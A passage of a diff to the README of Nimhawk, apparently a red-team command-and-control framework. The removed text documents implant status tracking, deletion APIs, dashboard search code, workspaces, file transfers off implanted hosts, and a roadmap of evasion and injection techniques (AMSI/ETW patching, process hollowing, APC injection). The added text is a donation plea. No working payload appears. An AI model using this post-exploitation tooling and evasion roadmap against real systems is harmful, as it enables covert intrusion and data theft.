-- **Inactive Implants**: Displayed in black, for implants that have been explicitly marked as inactive
+Remember: Reading code is a skill, and this project is designed to help you develop it.
 
-These improvements enhance operational awareness by providing immediate visual feedback on implant status.
 
-#### Inactive implant management
+## Support the Project
 
-A key feature addition is the ability to properly manage inactive implants:
+If you find **Nimhawk** useful in your work or work / research, consider supporting its development!  
+Contributions are always welcome — whether it's through code, ideas, or simply helping spread the word.  
 
-- **Deletion of Inactive Implants**: Operators can now delete inactive implants from the server database
-- **Automatic Cleanup**: When an implant is deleted, all associated records and files are properly removed
-- **Server-Side Implementation**: The Admin API includes endpoints for deleting inactive implants:
-  ```python
-  @app.route('/api/nimplants/<guid>', methods=['DELETE'])
-  @require_auth
-  def delete_nimplant(guid):
-      # Check if implant exists and is inactive
-      implant_details = db_get_nimplant_details(guid)
-      if not implant_details:
-          return flask.jsonify({"error": "Implant not found"}), 404
-      
-      if implant_details.get("active", True):
-          return flask.jsonify({"error": "Cannot delete an active implant"}), 400
-      
-      # Delete the implant if inactive
-      success = db_delete_nimplant(guid)
-      if success:
-          return flask.jsonify({"message": "Implant deleted successfully"}), 200
-      else:
-          return flask.jsonify({"error": "Failed to delete implant"}), 500
-  ```
-- **Client-Side Integration**: The UI provides delete buttons for inactive implants with confirmation dialogs
-- **Operational Security**: This feature helps maintain a clean database by removing implants that are no longer needed
+And hey, if coding isn't your thing, feel free to send a beer, you know, every bit helps keep the project going!
 
-#### Server-Side Implementation
-
-The multi-status system is implemented through a combination of backend logic and frontend representation:
-
-1. **Backend Status Determination**:
-   - In `db.py`, the `db_get_nimplant_details` function was enhanced to calculate implant status based on:
-     - Stored `active` flag for inactive implants
-     - Time comparison between `last_check_in` and current time
-     - Configurable thresholds for "late" and "disconnected" states
-   - Status determination logic example:
-   ```python
-   # Pseudo-code from db.py
-   if not implant_data["active"]:
-       implant_data["status"] = "inactive"
-   else:
-       try:
-           last_check = iso8601.parse_date(implant_data["last_check_in"])
-           now = datetime.now(timezone.utc)
-           time_difference = (now - last_check).total_seconds()
-           
-           if time_difference > 300:  # 5 minutes
-               implant_data["status"] = "disconnected"
-           elif time_difference > 120:  # 2 minutes
-               implant_data["status"] = "late"
-           else:
-               implant_data["status"] = "active"
-       except:
-           implant_data["status"] = "unknown"
-   ```
-
-2. **Implant Server Response Codes**:
-   - The `reconnect_nimplant` endpoint now returns status code 410 for inactive implants
-   - This informs the implant to clean up registry entries and terminate or re-register
-   - Helps maintain synchronization between server and client status
-
-3. **Frontend Implementation**:
-   - The React components were enhanced to visually represent different implant states:
-   - `NimplantOverviewCard.tsx` implements status-based styling:
-     ```typescript
-     // Status color determination
-     const getStatusColor = (status: string): string => {
-       switch(status) {
-         case 'active': return 'green';
-         case 'late': return 'orange';
-         case 'disconnected': return 'red';
-         case 'inactive': return 'dark';
-         default: return 'gray';
-       }
-     };
-     ```
-   - `NimplantDrawer.tsx` includes a `StatusIndicator` component that displays the current state:
-     ```typescript
-     const StatusIndicator = ({ status }: { status: string }) => {
-       return (
-         <Group spacing="xs">
-           <ThemeIcon color={getStatusColor(status)} size="sm" radius="xl">
-             <IconCircleFilled size="16" />
-           </ThemeIcon>
-           <Text size="sm" fw={500} tt="capitalize">{status}</Text>
-         </Group>
-       );
-     };
-     ```
-   - All status information is updated in real-time through the API polling mechanism
-   - Inactive implants display a delete button in both the card view and details drawer:
-     ```typescript
-     // Delete button implementation in NimplantOverviewCard.tsx
-     {nimplant.status === 'inactive' && (
-       <Button 
-         color="red" 
-         variant="subtle" 
-         size="xs"
-         onClick={(e) => {
-           e.stopPropagation();
-           openDeleteConfirmModal(nimplant.guid);
-         }}
-       >
-         <IconTrash size={16} />
-       </Button>
-     )}
-     
-     // Confirmation modal
-     const openDeleteConfirmModal = (guid: string) => modals.openConfirmModal({
-       title: 'Delete Implant',
-       centered: true,
-       children: (
-         <Text size="sm">
-           Are you sure you want to delete this inactive implant? This action cannot be undone.
-         </Text>
-       ),
-       labels: { confirm: 'Delete', cancel: 'Cancel' },
-       confirmProps: { color: 'red' },
-       onConfirm: () => deleteImplant(guid),
-     });
-     ```
-
-### 3. Search and filtering capabilities
-
-Advanced search and filtering capabilities have been implemented to enhance operator efficiency when managing multiple implants. These features provide powerful tools for quickly locating specific implants and focusing on relevant subsets of implants based on their status.
-
-#### Search Implementation
-
-The search functionality was implemented with real-time filtering:
-
-1. **Frontend Implementation**:
-   - A search input component was added to the ImplantList page:
-   ```typescript
-   // In pages/implants/index.tsx
-   const [searchTerm, setSearchTerm] = useState<string>('');
-   
-   // Search input component
-   <TextInput
-     placeholder="Search implants..."
-     leftSection={<FaSearch size={14} />}
-     value={searchTerm}
-     onChange={(e) => setSearchTerm(e.currentTarget.value)}
-     size="sm"
-     style={{ width: '300px' }}
-     styles={(theme: any) => ({
-       input: {
-         borderRadius: theme.radius.xl,
-       },
-     })}
-   />
-   ```
-
-2. **Search Logic**:
-   - The search function filters implants by matching the search term against multiple properties:
-   ```typescript
-   // Filtered implants based on search term
-   const filteredImplants = implants.filter(imp => {
-     if (!searchTerm) return true;
-     
-     const searchLower = searchTerm.toLowerCase();
-     return (
-       imp.hostname?.toLowerCase().includes(searchLower) ||
-       imp.username?.toLowerCase().includes(searchLower) ||
-       imp.guid?.toLowerCase().includes(searchLower) ||
-       imp.ipAddrInt?.toLowerCase().includes(searchLower) ||
-       imp.ipAddrExt?.toLowerCase().includes(searchLower) ||
-       imp.osBuild?.toLowerCase().includes(searchLower) ||
-       imp.pname?.toLowerCase().includes(searchLower)
-     );
-   });
-   ```
-
-3. **Optimizations**:
-   - The search is performed client-side for immediate results without additional server load
-   - Debouncing was implemented to prevent excessive re-renders during typing
-   - Search logic is case-insensitive and supports partial matches
-   - Performance is maintained through efficient React state management
-
-#### Status Filter Implementation
-
-Status filters were implemented to allow toggling visibility of implants by status:
-
-1. **Filter UI Component**:
-   ```typescript
-   // In components/StatusFilters.tsx
-   const StatusFilters = ({ 
-     activeFilters, 
-     onFilterChange 
-   }: StatusFiltersProps) => {
-     return (
-       <Paper p="md" radius="md" withBorder>
-         <Stack spacing="xs">
-           <Title order={6}>Status Filters</Title>
-           
-           <Group spacing="xs">
-             {statusOptions.map((status) => (
-               <Button
-                 key={status.value}
-                 variant={activeFilters.includes(status.value) ? "filled" : "outline"}
-                 color={status.color}
-                 leftIcon={status.icon}
-                 size="xs"
-                 onClick={() => onFilterChange(status.value)}
-               >
-                 {status.label}
-               </Button>
-             ))}
-           </Group>
-           
-           <Button 
-             variant="subtle" 
-             size="xs"
-             onClick={() => onFilterChange('reset')}
-           >
-             Reset Filters
-           </Button>
-         </Stack>
-       </Paper>
-     );
-   };
-   ```
-
-2. **Filter State Management**:
-   ```typescript
-   // In pages/implants/index.tsx
-   const [statusFilters, setStatusFilters] = useState<string[]>([]);
-   
-   const handleFilterChange = (status: string) => {
-     if (status === 'reset') {
-       setStatusFilters([]);
-       return;
-     }
-     
-     setStatusFilters(prev => {
-       if (prev.includes(status)) {
-         return prev.filter(s => s !== status);
-       } else {
-         return [...prev, status];
-       }
-     });
-   };
-   
-   // Apply filters to implants
-   const filteredByStatus = statusFilters.length > 0
-     ? filteredImplants.filter(imp => statusFilters.includes(imp.status))
-     : filteredImplants;
-   ```
-
-3. **Integration with Search**:
-   - Filters are applied after the search term, allowing combined searching and filtering
-   - The filtering system maintains the original implant array to allow toggling filters on/off
-   - Visual feedback indicates which filters are currently active
-
-#### "Show Inactive" Toggle Implementation
-
-The "Show Inactive" toggle was implemented as a global filter with its own state:
-
-1. **Component Implementation**:
-   ```typescript
-   // In pages/implants/index.tsx
-   const [showOnlyActive, setShowOnlyActive] = useState<boolean>(true);
-   
-   // Toggle switch
-   <Group>
-     <Text size="sm" fw={500}>Show inactive:</Text>
-     <Switch
-       checked={!showOnlyActive}
-       onChange={() => setShowOnlyActive(!showOnlyActive)}
-       color="teal"
-       size="md"
-       thumbIcon={
-         showOnlyActive ? (
-           <FaEyeSlash size="0.6rem" color="white" />
-         ) : (
-           <FaEye size="0.6rem" color="white" />
-         )
-       }
-     />
-   </Group>
-   ```
-
-2. **Filter Logic**:
-   ```typescript
-   // Final filtering with "show inactive" logic applied
-   const displayedImplants = showOnlyActive
-     ? filteredByStatus.filter(imp => imp.status !== 'inactive')
-     : filteredByStatus;
-   ```
-
-3. **Persistence**:
-   - The state is persisted in local storage to maintain user preference across sessions
-   - Default state is "OFF" to focus on active implants by default
-   - The toggle is prominently displayed in the header area for easy access
-
-#### Integration with API and Data Refresh
-
-The search and filtering system is fully integrated with the real-time data refresh mechanism:
-
-1. **Preserving State During Updates**:
-   ```typescript
-   // Preserve search and filter state when new data arrives
-   useEffect(() => {
-     const fetchImplants = async () => {
-       const result = await getImplants();
-       if (result.success) {
-         setImplants(result.data);
-         // Filters and search term are maintained in React state
-         // and automatically reapplied to the new data
-       }
-     };
-     
-     fetchImplants();
-     const interval = setInterval(fetchImplants, refreshInterval);
-     return () => clearInterval(interval);
-   }, [refreshInterval]);
-   ```
-
-2. **Performance Considerations**:
-   - The filtering system is optimized to handle large numbers of implants
-   - Memoization is used to prevent unnecessary re-renders
-   - Updates only affect the data, not the filter/search state
-
-#### Usage in Operations
-
-This search and filtering system significantly improves operational capabilities:
-
-1. **Quick Target Identification**:
-   - Operators can quickly locate specific implants by hostname, username, or IP
-   - Combined filtering allows focusing on, for example, only active implants in a specific subnet
-
-2. **Operational Awareness**:
-   - Status filters provide immediate visibility into problematic implants
-   - The "Show Inactive" toggle helps manage the lifecycle of implants
-
-3. **Large-Scale Operations**:
-   - The system scales effectively to handle hundreds of implants
-   - Performance remains smooth even with extensive filtering and searching
-
-4. **Workflow Enhancement**:
-   - The integrated search and filtering creates a seamless workflow for operators
-   - Visual indicators make it immediately clear which filters are active
-
-The search and filtering capabilities add significant value to the operational use of Nimhawk, particularly in enterprise environments where managing larger numbers of implants is common.
-
-### 4. User interface improvements
-
-- Implant details side panel (NimplantDrawer) completely redesigned
-- More comprehensive information about implant status
-- Display of relevant metrics such as check-in count
-- Better organization of information to facilitate analysis
-- Color-coded status indicators for quick visual assessment
-
-### 5. Implant deletion API
-
-The ability to delete inactive implants has been implemented with a comprehensive approach that ensures data integrity:
-
-#### API Implementation
-
-```python
-# In admin_server_init.py
-@app.route('/api/nimplants/<guid>', methods=['DELETE'])
-@require_auth
-def delete_nimplant(guid):
-    """
-    DELETE endpoint to remove an inactive implant from the database.
-    Only inactive implants can be deleted for safety reasons.
-    """
-    # Validate GUID format to prevent injection
-    if not utils.is_valid_guid(guid):
-        return flask.jsonify({"error": "Invalid GUID format"}), 400
-        
-    # Check if implant exists and is inactive
-    implant_details = db_get_nimplant_details(guid)
-    if not implant_details:
-        return flask.jsonify({"error": "Implant not found"}), 404
-    
-    if implant_details.get("active", True):
-        return flask.jsonify({"error": "Cannot delete an active implant"}), 400
-    
-    # Delete the implant
-    success = db_delete_nimplant(guid)
-    if success:
-        # Log the deletion
-        utils.nimplant_print(f"Implant {guid} deleted by administrator")
-        return flask.jsonify({"message": "Implant deleted successfully"}), 200
-    else:
-        return flask.jsonify({"error": "Failed to delete implant"}), 500
-```
-
-#### Database Operations
-
-The `db_delete_nimplant` function handles the comprehensive deletion of all implant-related data:
-
-```python
-# In db.py
-def db_delete_nimplant(guid):
-    """
-    Delete an implant and all its associated data from the database.
-    This includes command history, file downloads, and check-ins.
-    """
-    try:
-        with get_db_connection() as con:
-            # Begin transaction
-            con.execute("BEGIN TRANSACTION")
-            
-            # Delete command history
-            con.execute("DELETE FROM command_history WHERE nimplant_id = ?", (guid,))
-            
-            # Delete file downloads
-            con.execute("DELETE FROM downloads WHERE nimplant_id = ?", (guid,))
-            
-            # Delete check-ins
-            con.execute("DELETE FROM check_ins WHERE nimplant_id = ?", (guid,))
-            
-            # Delete the implant itself
-            con.execute("DELETE FROM nimplants WHERE id = ?", (guid,))
-            
-            # Commit transaction
-            con.execute("COMMIT")
-            
-        # Delete any downloaded files associated with this implant
-        download_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "downloads", guid)
-        if os.path.exists(download_dir) and os.path.isdir(download_dir):
-            shutil.rmtree(download_dir)
-            
-        return True
-    except Exception as e:
-        utils.nimplant_print(f"ERROR: Failed to delete implant {guid}: {e}")
-        # Rollback transaction if something goes wrong
-        if 'con' in locals():
-            con.execute("ROLLBACK")
-        return False
-```
-
-#### Security Considerations
-
-The implant deletion feature includes several security measures:
-
-1. **Inactive-Only Deletion**: Only implants marked as inactive can be deleted, preventing accidental deletion of active connections
-2. **Authorization Required**: The endpoint is protected by the `@require_auth` decorator to ensure only authenticated users can delete implants
-3. **GUID Validation**: The GUID is validated to prevent SQL injection or other attacks
-4. **Transaction-Based**: Database operations are wrapped in a transaction to maintain data integrity
-5. **Comprehensive Cleanup**: All related data and files are deleted to prevent orphaned records
-6. **Error Handling**: Robust error handling with transaction rollback in case of failure
-7. **Audit Logging**: All deletion operations are logged for accountability
-
-## Subsystem architecture
-
-### Workspace system architecture
-
-Workspaces are primarily managed through the following database tables:
-
-- **workspaces**: Stores workspace metadata including UUID, name, and creation date
-- **nimplant**: Contains a workspace_uuid field that references the workspaces table
-
-**Key relationships:**
-- One-to-many relationship between workspaces and implants
-- Implants may belong to at most one workspace or none (NULL workspace_uuid)
-
-The workspace system is implemented through these primary functions in `db.py`:
-
-1. **db_create_workspace(workspace_name)**: 
-   - Creates a new workspace with a generated UUID
-   - Returns the UUID of the newly created workspace
-   - Used by the API endpoint for workspace creation
-
-2. **db_get_workspaces()**:
-   - Retrieves all workspaces ordered by creation date
-   - Returns workspace data including UUID, name, and creation date
-   - Used for populating workspace lists in the UI
-
-3. **db_assign_nimplant_to_workspace(nimplant_guid, workspace_uuid)**:
-   - Assigns an existing implant to a specific workspace
-   - Updates the workspace_uuid field in the implant record
-   - Used when manually assigning implants to workspaces
-
-4. **db_remove_nimplant_from_workspace(nimplant_guid)**:
-   - Removes an implant from its current workspace (sets workspace_uuid to NULL)
-   - Used when unassigning an implant from a workspace
-
-5. **db_get_nimplants_by_workspace(workspace_uuid)**:
-   - Retrieves all implants assigned to a specific workspace
-   - Returns detailed implant information for each matching record
-   - Used for filtering implants by workspace in the UI
-
-6. **db_delete_workspace(workspace_uuid)**:
-   - Deletes a workspace and removes all implant associations
-   - Does not delete the implants themselves
-   - Updates all implants to have NULL workspace_uuid
-
-**API Endpoints:**
-
-The workspace API is implemented in `admin_server_init.py` with these endpoints:
-
-- **GET /api/workspaces**: Lists all workspaces
-- **POST /api/workspaces**: Creates a new workspace
-- **DELETE /api/workspaces/<workspace_uuid>**: Deletes a specific workspace
-- **GET /api/workspaces/<workspace_uuid>/nimplants**: Lists implants in a workspace
-- **POST /api/workspaces/assign**: Assigns implant to workspace
-- **POST /api/workspaces/remove**: Removes implant from workspace
-
-**Frontend Implementation:**
-
-The workspace UI components include:
-
-1. **WorkspaceSelector.tsx**: Component for workspace selection and management
-2. **WorkspaceBadge.tsx**: Visual representation of workspace with color coding
-3. **CreateWorkspaceModal.tsx**: Modal for creating new workspaces
-
-**Communication Flow:**
-
-The workspace UUID is passed to implants through the X-Robots-Tag HTTP header. This occurs at two key points:
-
-1. **Initial Registration**: When an implant first registers, it can include the workspace UUID in the header
-2. **Reassignment**: When an implant is assigned to a different workspace, the change is stored in the database
-
-### File exchange system implementation
-
-File transfers are tracked through these primary tables:
-
-- **file_transfers**: Records metadata about each transfer operation
-- **file_hash_mapping**: Maps file hashes to original filenames and paths
-- **downloads**: Contains information about files downloaded from implants
-
-**Core Functions:**
-
-The file exchange system is implemented through these key functions in `db.py`:
-
-1. **db_log_file_transfer(nimplant_guid, filename, size, operation_type)**:
-   - Records a file transfer operation in the database
-   - Tracks the implant GUID, filename, size, and operation type
-   - Used for logging all file operations (upload, download, view)
-
-2. **db_get_file_transfers(nimplant_guid, limit=50)**:
-   - Retrieves file transfer history for a specific implant
-   - Limited to the specified number of most recent transfers
-   - Used for displaying implant-specific file history
-
-3. **db_get_file_transfers_api(nimplant_guid=None, limit=50)**:
-   - Returns file transfers with optional filtering by implant
-   - Used by the API endpoint for retrieving transfer history
-   - Includes hostname and username information from nimplant table
-
-4. **db_store_file_hash_mapping(file_hash, original_filename, file_path)**:
-   - Creates or updates a mapping between file hash and original filename
-   - Ensures original filenames are preserved even with hash-based storage
-   - Critical for file identification and retrieval
-
-5. **db_get_file_info_by_hash(file_hash)**:
-   - Retrieves original filename and path based on file hash
-   - Used when serving files through the API
-   - Returns None for both values if hash is not found
-
-**File Storage Organization:**
-
-Files are stored in the filesystem with this structure:
-
-- **downloads/{nimplant_guid}/**:
-  - Contains files downloaded from a specific implant
-  - Files are named with their MD5 hash to avoid conflicts
-  - Original filenames are stored in the database
-
-- **uploads/**:
-  - Contains files prepared for upload to implants
-  - Used as a staging area before transfer
-  - Files are cleaned up after successful transfer
-
-**API Endpoints:**
-
-The file exchange API is implemented with these endpoints:
-
-- **GET /api/downloads**: Lists all downloaded files
-- **GET /api/downloads/{nimplant_guid}/{filename}**: Serves a specific file
-- **GET /api/file-transfers**: Lists all file transfers
-- **GET /api/file-transfers/{nimplant_guid}**: Lists transfers for an implant
-- **POST /api/upload**: Uploads a file to the server for transfer to implants
-
-**Frontend Components:**
-
-Key UI components for file management:
-
-1. **FileListComponent.tsx**: Generic component for displaying file lists
-2. **DownloadList.tsx**: Component for displaying global download lists
-3. **ImplantDownloadList.tsx**: Component for implant-specific downloads
-4. **FilePreview.tsx**: Component for rendering file previews
-5. **FileTypeIcon.tsx**: Component for displaying appropriate file type icons
-
-**Transfer Process Flow:**
-
-The complete file transfer process works as follows:
-
-##### Download Process (implant to server):
-1. Client issues a download command for a specific file
-2. Command is queued as a pending task for the implant
-3. Implant executes the task, reads the file, and encodes it
-4. Implant transmits file data to server via POST request to resultPath
-5. Server decodes the data and saves it to downloads/{nimplant_guid}/
-6. Server logs the transfer in the database with operation type "DOWNLOAD"
-7. File is accessible via the downloads endpoint with its recorded metadata
-
-##### Upload Process (server to implant):
-1. Client uploads a file through the web interface or API
-2. File is saved to the uploads directory with a unique identifier
-3. A task is created for the implant to download the file
-4. Implant requests the file via the task_path endpoint
-5. Server serves the file to the implant
-6. Implant saves the file to the specified location
-7. Implant confirms completion and server logs the transfer
-
-**Security Considerations:**
-
-The file exchange system implements several security measures:
-
-1. **Authentication**: All file transfers require proper authentication
-2. **Encryption**: File data is encrypted during transit
-3. **Integrity Verification**: File hashes are verified after transfer
-4. **Access Control**: Files are only accessible to authorized users
-5. **Content Validation**: Basic validation of file types and contents
-
-**Error Handling:**
-
-The system includes robust error handling for:
-
-1. **File Not Found**: When requested files don't exist
-2. **Permission Issues**: When files can't be read or written
-3. **Transmission Errors**: When data becomes corrupted during transfer
-4. **Storage Limits**: When disk space is insufficient
-5. **Concurrent Access**: When multiple operations target the same resource
-
-## Future plans
-
-We have made significant progress on several planned improvements, with successful implementation of the enhanced reconnection system and multi-status implant support. We continue to work on other key areas:
-
-### Already Implemented
-- ✅ Enhanced reconnection system with registry cleanup
-- ✅ Multi-status implant visualization system
-- ✅ UI improvements for better operational awareness
-- ✅ Server-side status determination logic
-- ✅ Inactive implant deletion functionality
-
-### In Progress
-- **Advanced Evasion Techniques**:
-  - NTDLL Unhook
-  - AMSI and ETW patching/bypassing mechanisms
-  - Sleep obfuscation techniques (Ekko is already in place thanks to @chvancooten)
-  - Memory payload protection (encryption at rest)
-
-- **Stealthiness Analysis Framework**:
-  - Expanding the `detection` directory from Nimplant's original detection rules to a comprehensive toolkit
-  - Implementing PE-sieve integration for runtime memory analysis
-  - Creating ThreatCheck-like functionality to identify specific detection signatures
-
-### Planned
-- **Payload Delivery Mechanisms**:
-  - Classic DLL Injection
-  - Remote Shellcode Injection
-  - Process Hollowing with advanced unmapping techniques
-  - Thread Hijacking with context manipulation
-  - APC Injection (standard and early bird variants)
-  - And many additional techniques
-
-- **Defense Evasion**:
-  - Anti-sandbox detection techniques
-  - Anti-analysis countermeasures
-  - Stack spoofing for hiding call stacks
-
-## Contributing
-
-If you're interested in contributing to Nimhawk, we welcome your input and expertise. The project is designed with modularity in mind to make contributions more accessible.
-
-### Contributing Guidelines
-
-1. **Fork the repository** and create a feature branch from the main branch
-2. **Make your changes** following the established code style and architecture
-3. **Add tests** if applicable for the new functionality
-4. **Update documentation** to reflect changes made
-5. **Submit a pull request** with a clear description of the changes and their purpose
-
-### Contributing to the reconnection system
-
-If you wish to further enhance the reconnection system, here are some areas to focus on:
-
-1. **Advanced Registry Handling**:
-   - Implement additional storage locations for increased resilience
-   - Add encryption for stored registry values
-   - Implement registry monitoring for tampering detection
-
-2. **Connection Resilience**:
-   - Enhance proxy support for reconnection paths
-   - Implement additional transport methods for challenging network environments
-   - Add circuit breaker patterns to prevent excessive reconnection attempts
-
-3. **Additional Status States**:
-   - Implement more granular status tracking (e.g., "sleeping", "awaiting commands", etc.)
-   - Add customizable thresholds for the different status states
-
-## License
-
-This project is licensed under the MIT License. See the LICENSE file for details.
-
-## If You've Reached This Point:
-
-We encourage you to fork the repository, contribute your code, and submit a pull request! Your contributions are invaluable in enhancing the Nimhawk project and fostering a collaborative development environment.
+[![Buy Me A Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/hdbreaker9s)
 
